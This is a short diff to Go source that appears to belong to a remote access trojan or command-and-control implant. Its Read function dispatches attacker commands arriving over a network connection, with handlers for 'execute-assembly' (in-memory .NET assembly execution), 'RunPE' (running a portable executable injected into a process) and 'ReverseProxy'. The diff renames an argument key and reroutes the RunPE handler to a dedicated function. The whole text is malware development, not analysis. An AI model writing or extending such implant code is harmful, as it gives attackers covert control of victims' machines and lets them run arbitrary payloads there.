@@ -492,7 +492,7 @@ func Read(Data []byte, Connection net.Conn) {
 	case "execute-assembly":
 		{
 			data := unmsgpack.ForcePathObject("File").GetAsBytes()
-			args := unmsgpack.ForcePathObject("ARGS").GetAsString()
+			args := unmsgpack.ForcePathObject("args").GetAsString()
 			fmt.Println(args)
 			go func() {
 				if PcInfo.IsDotNetFour {
@@ -505,17 +505,8 @@ func Read(Data []byte, Connection net.Conn) {
 	case "RunPE":
 		{
 			go func() {
-				stdIO := pluginCmd(*unmsgpack)
-				//fmt.Println(stdIO)
+				RunPE(*unmsgpack, Connection)
 
-				result := ""
-				result = string(stdIO)
-				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
-				if err != nil {
-					//Log(err.Error(), Connection, *unmsgpack)
-					utf8Stdout = err.Error()
-				}
-				SessionLog(utf8Stdout, Connection, *unmsgpack)
 			}()
 		}
 	case "ReverseProxy":
